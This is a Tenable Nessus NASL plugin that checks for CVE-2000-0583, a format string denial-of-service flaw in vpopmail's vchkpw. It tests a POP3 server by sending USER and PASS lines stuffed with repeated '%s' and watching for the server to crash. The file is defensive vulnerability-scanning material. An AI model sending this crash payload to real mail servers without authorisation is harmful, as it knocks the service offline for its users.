#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10463);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2000-0583");
 script_bugtraq_id(1418);
 script_xref(name:"OSVDB", value:"362");

 script_name(english:"vpopmail vchkpw USER/PASS Command Format String");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server has a PHP script that is affected
by a denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote vpopmail server is vulnerable to an input 
validation bug which may allow any user to crash the server 
by providing a specially crafted username." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to vpopmail 4.8 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_summary(english:"Logs into the pop3 server with a crafted username");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl", "qpopper.nasl");
 script_exclude_keys("pop3/false_pop3");
 script_require_ports("Services/pop3", 110);
 exit(0);
}

#
# The script code starts here
#

fake = get_kb_item("pop3/false_pop3");
if(fake)exit(0);
port = get_kb_item("Services/pop3");
if(!port)port = 110;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  d = recv_line(socket:soc, length:1024);
  if(!d){close(soc);exit(0);}
  
  c = string("USER ", crap(length:1024, data:"%s"), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  c = string("PASS ", crap(length:1024, data:"%s"), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  if("aack, child crashed" >< d)security_warning(port);
  close(soc);
  }
}
